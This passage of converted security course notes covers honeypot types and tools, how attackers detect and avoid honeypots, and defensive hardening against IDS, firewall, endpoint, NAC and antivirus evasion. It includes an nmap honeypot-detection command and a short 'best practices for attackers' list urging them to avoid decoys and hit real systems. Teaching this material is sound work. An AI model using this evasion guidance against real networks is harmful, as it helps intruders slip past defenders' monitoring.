> Decoy system designed to attract attackers and record intrusion behavior, tactics, and techniques without exposing production systems.
> 
> 
> #### 🔹 Honeypot Purpose:
> 
> 
> 
> #### 🔹 Attract attackers  Lure malicious actors
> 
> 
> 
> #### 🔹 Record intrusion behavior  Log attack techniques
> 
> 
> 
> #### 🔹 Threat intelligence  Understand attacker methods
> 
> 
> 
> #### 🔹 Early warning  Detect reconnaissance
> 
> 
> 
> #### 🔹 Distract attackers  Divert from real systems
> 
> 
> 
> #### 🔹 Research  Study attack trends
> 
> 
> 
> #### 🔹 Honeypot Characteristics:
> 
> 
> 
> #### 🔹 Isolated from production
> 
> 
> 
> #### 🔹 Monitored extensively
> 
> 
> 
> #### 🔹 No legitimate business purpose
> 
> 
> 
> #### 🔹 4 1
> 
>
> ---
>
> ### 📍 Page 42
>
> 
> #### 🔹 Appears vulnerable
> 
> 
> 
> #### 🔹 Records all interactions
> 
> 
> 
> #### 🔹 6.2 Types of Honeypots
> 
> 
> 
> #### 🔹 By Interaction Level
> 
> 
> 
> #### 🔹 Low-Interaction Honeypots
> 
> 
> 
> #### 🔹 Simulated services with limited functionality
> 
> 
> 
> #### 🔹 Dionaea  Malware capture honeypot
> 
> 
> 
> #### 🔹 Honeyd  Virtual honeypot daemon
> 
> 
> 
> #### 🔹 Cowrie  SSH/Telnet honeypot
> 
> 
> 
> #### 🔹 Safe deployment
> 
> 
> 
> #### 🔹 Limited attacker engagement
> 
> 
> 
> #### 🔹 High-Interaction Honeypots
> 
> 
> 
> #### 🔹 Real servers with full OS and monitoring
> 
> 
> 
> #### 🔹 Kippo/Cowrie  Full SSH environment
> 
> 
> 
> #### 🔹 Honeydrive  Complete honeypot distro
> 
> 
> 
> #### 🔹 Greater intelligence value
> 
> 
> 
> #### 🔹 Higher risk and resource requirements
> 
> 
> 
> #### 🔹 By Purpose
> 
> 
> 
> #### 🔹 Research Honeypots
> 
> 
> 
> #### 🔹 Study attack trends
> 
> 
> 
> #### 🔹 Malware collection
> 
> 
> 
> #### 🔹 Threat intelligence
> 
> 
> 
> #### 🔹 Academic research
> 
> 
> 
> #### 🔹 Production Honeypots
> 
> 
> 
> #### 🔹 Deployed in live networks
> 
> 
> 
> #### 🔹 Early warning system
> 
>
> ---
>
> ### 📍 Page 43
>
> 
> #### 🔹 Distraction from real assets
> 
> 
> 
> #### 🔹 Legal evidence collection
> 
> 
> 
> #### 🔹 By Deployment
> 
> 
> 
> #### 🔹 Client Honeypots
> 
> 
> 
> #### 🔹 Actively visit websites
> 
> 
> 
> #### 🔹 Detect malicious servers
> 
> 
> 
> #### 🔹 Drive-by download detection
> 
> 
> 
> #### 🔹 Server Honeypots
> 
> 
> 
> #### 🔹 Wait for attackers
> 
> 
> 
> #### 🔹 Emulate vulnerable services
> 
> 
> 
> #### 🔹 Most common type
> 
> 
> 
> #### 🔹 6.3 Honeypot Tools
> 
> 
> 
> #### 🔹 Popular Honeypot Solutions:
> 
> 
> 
> #### 🔹 Honeyd
> 
> 
> 
> #### 🔹 Virtual honeypot framework
> 
> 
> 
> #### 🔹 Simulate thousands of systems
> 
> 
> 
> #### 🔹 Configurable services
> 
> 
> 
> #### 🔹 Low interaction
> 
> 
> 
> #### 🔹 Cowrie
> 
> 
> 
> #### 🔹 SSH/Telnet honeypot
> 
> 
> 
> #### 🔹 Medium interaction
> 
> 
> 
> #### 🔹 Logging and recording
> 
> 
> 
> #### 🔹 Fake file system
> 
> 
> 
> #### 🔹 Kippo
> 
> 
> 
> #### 🔹 SSH honeypot (predecessor to Cowrie)
> 
> 
> 
> #### 🔹 Command logging
> 
> 
> 
> #### 🔹 Session recording
> 
>
> ---
>
> ### 📍 Page 44
>
> 
> #### 🔹 Conpot
> 
> 
> 
> #### 🔹 ICS/SCADA honeypot
> 
> 
> 
> #### 🔹 Industrial control systems
> 
> 
> 
> #### 🔹 Protocol emulation
> 
> 
> 
> #### 🔹 Glastopf
> 
> 
> 
> #### 🔹 Web application honeypot
> 
> 
> 
> #### 🔹 Emulate vulnerabilities
> 
> 
> 
> #### 🔹 Attack collection
> 
> 
> 
> #### 🔹 Modern Honey Network MHN
> 
> 
> 
> #### 🔹 Centralized honeypot management
> 
> 
> 
> #### 🔹 Multiple honeypot types
> 
> 
> 
> #### 🔹 Visualization and reporting
> 
> 
> 
> #### 🔹 Easy deployment
> 
> 
> 
> #### 🔹 6.4 Detecting Honeypots
> 
> 
> 
> #### 🔹 Attacker Detection Methods:
> 
> 
> 
> #### 🔹 Latency Anomalies
> 
> 
> 
> #### 🔹 Unrealistic response times
> 
> 
> 
> #### 🔹 VM detection artifacts
> 
> 
> 
> #### 🔹 Network latency patterns
> 
> 
> 
> #### 🔹 Open Ports Mismatch
> 
> 
> 
> #### 🔹 Too many open services
> 
> 
> 
> #### 🔹 Unusual service combinations
> 
> 
> 
> #### 🔹 All ports responding
> 
> 
> 
> #### 🔹 Interaction Depth
> 
> 
> 
> #### 🔹 Limited functionality
> 
> 
> 
> #### 🔹 Scripted responses
> 
> 
> 
> #### 🔹 Missing deeper features
> 
>
> ---
>
> ### 📍 Page 45
>
> 
> #### 🔹 Honey Tokens
> 
> 
> 
> #### 🔹 Detect fake data
> 
> 
> 
> #### 🔹 Traceable credentials
> 
> 
> 
> #### 🔹 Canary tokens
> 
> 
> 
> #### 🔹 System Fingerprinting
> 
> 
> 
> #### 🔹 OS fingerprint inconsistencies
> 
> 
> 
> #### 🔹 Known honeypot signatures
> 
> 
> 
> #### 🔹 VM detection
> 
> 
> 
> #### 🔹 Identifiable File Paths
> 
> 
> 
> #### 🔹 Default honeypot paths
> 
> 
> 
> #### 🔹 Specific directory structures
> 
> 
> 
> #### 🔹 Cowrie/Kippo artifacts
> 
> 
> 
> #### 🔹 Behavioral Analysis:
> 
> 
> 
> #### 🔹 No real users present
> 
> 
> 
> #### 🔹 No legitimate traffic
> 
> 
> 
> #### 🔹 Unusual resource usage
> 
> 
> 
> #### 🔹 Perfect uptime
> 
> 
> 
> #### 🔹 6.5 Defeating Honeypots
> 
> 
> 
> #### 🔹 Avoidance Strategies:
> 
> 
> 
> #### 🔹 Reconnaissance First
> 
> 
> 
> #### 🔹 Identify honeypots before attack
> 
> 
> 
> #### 🔹 Avoid suspicious systems
> 
> 
> 
> #### 🔹 Target verification
> 
> 
> 
> #### 🔹 Fingerprinting Tools
> 
> 
> 
> #### 🔹 # Nmap honeypot detection
> 
> 
> 
> #### 🔹 nmap --script honeypot-detect target.com
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 46 to 50 Syllabus Content**
>
> ### 📍 Page 46
>
> 
> #### 🔹 # Custom scripts
> 
> 
> 
> #### 🔹 python honeypot-detector.py target.com
> 
> 
> 
> #### 🔹 Detection Techniques:
> 
> 
> 
> #### 🔹 Check for VM artifacts
> 
> 
> 
> #### 🔹 Test service depth
> 
> 
> 
> #### 🔹 Analyze network topology
> 
> 
> 
> #### 🔹 Verify user activity
> 
> 
> 
> #### 🔹 Best Practices for Attackers:
> 
> 
> 
> #### 🔹 Avoid obvious honeypots
> 
> 
> 
> #### 🔹 Target real systems only
> 
> 
> 
> #### 🔹 Use multiple verification methods
> 
> 
> 
> #### 🔹 Monitor for honey tokens
> 
> 
> 
> #### 🔹 7. Countermeasures
> 
> 
> 
> #### 🔹 7.1 Defending Against IDS Evasion
> 
> 
> 
> #### 🔹 IDS Hardening:
> 
> 
> 
> #### 🔹 Enable Deep Packet Inspection DPI
> 
> 
> 
> #### 🔹 Full payload analysis
> 
> 
> 
> #### 🔹 Protocol verification
> 
> 
> 
> #### 🔹 Content inspection
> 
> 
> 
> #### 🔹 Reassemble Fragmented Packets
> 
> 
> 
> #### 🔹 IP defragmentation
> 
> 
> 
> #### 🔹 TCP stream reassembly
> 
> 
> 
> #### 🔹 Application-layer reconstruction
> 
> 
> 
> #### 🔹 Use Hybrid Detection
> 
> 
> 
> #### 🔹 Signature  Anomaly detection
> 
> 
> 
> #### 🔹 Behavioral analysis
> 
>
> ---
>
> ### 📍 Page 47
>
> 
> #### 🔹 Machine learning models
> 
> 
> 
> #### 🔹 Enable TLS Decryption
> 
> 
> 
> #### 🔹 SSL/TLS inspection
> 
> 
> 
> #### 🔹 Certificate-based decryption
> 
> 
> 
> #### 🔹 Encrypted traffic analysis
> 
> 
> 
> #### 🔹 Monitor Encrypted Tunnels
> 
> 
> 
> #### 🔹 DNS tunnel detection
> 
> 
> 
> #### 🔹 ICMP tunnel detection
> 
> 
> 
> #### 🔹 Unusual protocol behavior
> 
> 
> 
> #### 🔹 Proper Fail Logic
> 
> 
> 
> #### 🔹 Fail-closed for IPS (block on failure)
> 
> 
> 
> #### 🔹 Fail-open considerations
> 
> 
> 
> #### 🔹 Redundancy planning
> 
> 
> 
> #### 🔹 Additional Measures:
> 
> 
> 
> #### 🔹 Regular signature updates
> 
> 
> 
> #### 🔹 Tune for false positives
> 
> 
> 
> #### 🔹 Comprehensive logging
> 
> 
> 
> #### 🔹 Threat intelligence integration
> 
> 
> 
> #### 🔹 7.2 Defending Against Firewall Evasion
> 
> 
> 
> #### 🔹 Firewall Hardening:
> 
> 
> 
> #### 🔹 Block Unauthorized Tunnels
> 
> 
> 
> #### 🔹 DNS tunnel detection
> 
> 
> 
> #### 🔹 ICMP tunneling prevention
> 
> 
> 
> #### 🔹 HTTP tunnel blocking
> 
> 
> 
> #### 🔹 Disable IP Source Routing
> 
> 
> 
> #### 🔹 no ip source-route
> 
>
> ---
>
> ### 📍 Page 48
>
> 
> #### 🔹 Restrict DNS Traffic
> 
> 
> 
> #### 🔹 Disallow DNS over non-standard ports
> 
> 
> 
> #### 🔹 Monitor DNS query patterns
> 
> 
> 
> #### 🔹 Block DNS tunneling signatures
> 
> 
> 
> #### 🔹 Enforce SSL/TLS Inspection
> 
> 
> 
> #### 🔹 Man-in-the-middle SSL inspection
> 
> 
> 
> #### 🔹 Certificate validation
> 
> 
> 
> #### 🔹 Encrypted traffic decryption
> 
> 
> 
> #### 🔹 Limit Outbound Proxies
> 
> 
> 
> #### 🔹 Whitelist approved proxies
> 
> 
> 
> #### 🔹 Block unauthorized proxy usage
> 
> 
> 
> #### 🔹 Monitor proxy traffic
> 
> 
> 
> #### 🔹 Filter ICMP Types
> 
> 
> 
> #### 🔹 Allow only necessary ICMP
> 
> 
> 
> #### 🔹 Block ICMP redirect
> 
> 
> 
> #### 🔹 Limit ICMP payload sizes
> 
> 
> 
> #### 🔹 Additional Protections:
> 
> 
> 
> #### 🔹 Application-aware filtering
> 
> 
> 
> #### 🔹 Geo-blocking
> 
> 
> 
> #### 🔹 Rate limiting
> 
> 
> 
> #### 🔹 Egress filtering
> 
> 
> 
> #### 🔹 7.3 Defending Against Endpoint Evasion
> 
> 
> 
> #### 🔹 Endpoint Protection:
> 
> 
> 
> #### 🔹 EDR with Behavior Analytics
> 
> 
> 
> #### 🔹 Endpoint Detection & Response
> 
> 
> 
> #### 🔹 Behavioral analysis
> 
> 
> 
> #### 🔹 Memory scanning
> 
>
> ---
>
> ### 📍 Page 49
>
> 
> #### 🔹 Process monitoring
> 
> 
> 
> #### 🔹 Kernel-Based Monitoring
> 
> 
> 
> #### 🔹 Driver-level visibility
> 
> 
> 
> #### 🔹 Rootkit detection
> 
> 
> 
> #### 🔹 Deep system monitoring
> 
> 
> 
> #### 🔹 Disable LoLBins Where Possible
> 
> 
> 
> #### 🔹 # Disable PowerShell v2
> 
> 
> Disable-WindowsOptionalFeature Online FeatureName MicrosoftWindow
> 
> 
> #### 🔹 sPowerShellV2Root
> 
> 
> 
> #### 🔹 # AppLocker rules
> 
> 
> 
> #### 🔹 # Block specific LoLBins
> 
> 
> 
> #### 🔹 Strong PowerShell Logging
> 
> 
> 
> #### 🔹 # Enable script block logging
> 
> 
> Set-ItemProperty Path "HKLM\Software\Policies\Microsoft\Windows\Pow erShell\ScriptBlockLogging" Name "EnableScriptBlockLogging" Value 1
> 
> 
> #### 🔹 # Enable transcription
> 
> 
> Set-ItemProperty Path "HKLM\Software\Policies\Microsoft\Windows\Pow
> 
> 
> #### 🔹 erShell\Transcription" Name "EnableTranscripting" Value 1
> 
> 
> 
> #### 🔹 Secure Boot  Code Signing
> 
> 
> 
> #### 🔹 UEFI Secure Boot
> 
> 
> 
> #### 🔹 Driver signature enforcement
> 
> 
> 
> #### 🔹 Application whitelisting
> 
> 
> 
> #### 🔹 Memory Scanning
> 
> 
> 
> #### 🔹 Runtime memory inspection
> 
> 
> 
> #### 🔹 Inject detection
> 
> 
> 
> #### 🔹 Hollowing detection
> 
> 
> 
> #### 🔹 Additional Measures:
> 
>
> ---
>
> ### 📍 Page 50
>
> 
> #### 🔹 AMSI protection
> 
> 
> 
> #### 🔹 Constrained Language Mode
> 
> 
> 
> #### 🔹 JEA Just Enough Administration)
> 
> 
> 
> #### 🔹 Credential Guard
> 
> 
> 
> #### 🔹 7.4 Defending Against NAC Evasion
> 
> 
> 
> #### 🔹 NAC Hardening:
> 
> 
> 
> #### 🔹 Certificate-Based Authentication
> 
> 
> 
> #### 🔹 802.1X with certificates
> 
> 
> 
> #### 🔹 PKI infrastructure
> 
> 
> 
> #### 🔹 Device certificates
> 
> 
> 
> #### 🔹 Enforce 802.1X
> 
> 
> 
> #### 🔹 Port-based network access control
> 
> 
> 
> #### 🔹 EAP authentication
> 
> 
> 
> #### 🔹 RADIUS integration
> 
> 
> 
> #### 🔹 Device Posture Checks
> 
> 
> 
> #### 🔹 Antivirus status
> 
> 
> 
> #### 🔹 Patch level verification
> 
> 
> 
> #### 🔹 Firewall status
> 
> 
> 
> #### 🔹 Encryption compliance
> 
> 
> 
> #### 🔹 Implement Dynamic VLANs
> 
> 
> 
> #### 🔹 VLAN assignment based on authentication
> 
> 
> 
> #### 🔹 Role-based access
> 
> 
> 
> #### 🔹 Quarantine VLAN for non-compliant devices
> 
> 
> 
> #### 🔹 Bind Ports to Device Identity
> 
> 
> 
> #### 🔹 MAC address binding
> 
> 
> 
> #### 🔹 Port security
> 
> 
> 
> #### 🔹 Sticky MAC addresses
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 51 to 52 Syllabus Content**
>
> ### 📍 Page 51
>
> 
> #### 🔹 7.5 Defending Against Antivirus Evasion
> 
> 
> 
> #### 🔹 AV Enhancement:
> 
> 
> 
> #### 🔹 Enable Cloud-Based Scanning
> 
> 
> 
> #### 🔹 Real-time threat intelligence
> 
> 
> 
> #### 🔹 Behavioral analysis in cloud
> 
> 
> 
> #### 🔹 Collective detection
> 
> 
> 
> #### 🔹 Use Hybrid Detection
> 
> 
> 
> #### 🔹 Signature  Behavior
> 
> 
> 
> #### 🔹 Heuristic analysis
> 
> 
> 
> #### 🔹 Sandboxing
> 
> 
> 
> #### 🔹 Enable AMSI  Anti-Tamper
> 
> 
> 
> #### 🔹 Protected process light
> 
> 
> 
> #### 🔹 Tamper protection enabled
> 
> 
> 
> #### 🔹 Kernel-mode protection
> 
> 
> 
> #### 🔹 Sandbox Analysis
> 
> 
> 
> #### 🔹 Detonation chambers
> 
> 
> 
> #### 🔹 Automated malware analysis
> 
> 
> 
> #### 🔹 Behavior-based detection
> 
> 
> 
> #### 🔹 Continuous Patching
> 
> 
> 
> #### 🔹 Regular security updates
> 
> 
> 
> #### 🔹 Zero-day protection
> 
> 
> 
> #### 🔹 Vulnerability management
> 
> 
> 
> #### 🔹 Additional Protections:
> 
> 
> 
> #### 🔹 Application control
> 
> 
> 
> #### 🔹 EDR deployment
> 
> 
> 
> #### 🔹 Threat hunting
> 
> 
> 
> #### 🔹 Incident response readiness
> 
>
> ---
>
> ### 📍 Page 52
>
> 
> #### 🔹 ✅Module Summary
> 
> 
> This module covered comprehensive IDS, firewall, and honeypot
> 
> 
> #### 🔹 evasion concepts and defenses:
> 
> 
> 
> #### 🔹 Key Takeaways:
> 
> 
> IDS/IPS Concepts  Detection mechanisms (signature, anomaly,
> 
> 
> #### 🔹 heuristic), alert types TP/FP/TN/FN, NIDS vs HIDS
> 
> 
> Firewall Types  Packet filtering, stateful, NGFW, proxy, circuit-
> 
> 
> #### 🔹 level, application-level
> 
> 
> 
> #### 🔹 Evasion Techniques  Fragmentation, IP spoofing, tunneling
> 
> 
> 
> #### 🔹 ICMP, DNS, HTTP, SSH, session splicing, encryption
> 
> 
> 
> #### 🔹 Tunneling Methods  ICMP, ACK, HTTP, SSH, DNS tunneling for
> 
> 
> 
> #### 🔹 firewall bypass and C2 communication
> 
> 
> 
> #### 🔹 WAF Bypass  XSS evasion, encoding, obfuscation, HTML
> 
> 
> 
> #### 🔹 smuggling, chunked encoding
> 
> 
> 
> #### 🔹 Endpoint Evasion  LoLBins abuse, process injection, AMSI
> 
> 
> 
> #### 🔹 bypass, application whitelisting bypass
> 
> 
> 
> #### 🔹 NAC Evasion  MAC spoofing, VLAN hopping, pre-auth device
> 
> 
> 
> #### 🔹 spoofing
> 
> 
> 
> #### 🔹 Honeypot Types  Low/high interaction, client/server,
> 
> 
> 
> #### 🔹 production/research honeypots
> 
> 
> 
> #### 🔹 Detection Tools  Snort, Suricata, Zeek, OSSEC, Wazuh, YARA
> 
> 
> 
> #### 🔹 Countermeasures  DPI, packet reassembly, SSL inspection,
> 
> 
> 
> #### 🔹 EDR, behavior analytics, 802.1X, AMSI protection
> 
> 
> IDS and firewall evasion remains a critical attack technique, leveraging fragmentation, tunneling, encryption, and legitimate tool abuse. Effective defense requires deep packet inspection, traffic reassembly, encrypted traffic analysis, endpoint behavior monitoring, and comprehensive security policies. Organizations must implement defense-in-depth strategies including network security controls, endpoint protection, user awareness, and continuous monitoring to detect and prevent evasion attempts.
>
> ---
>
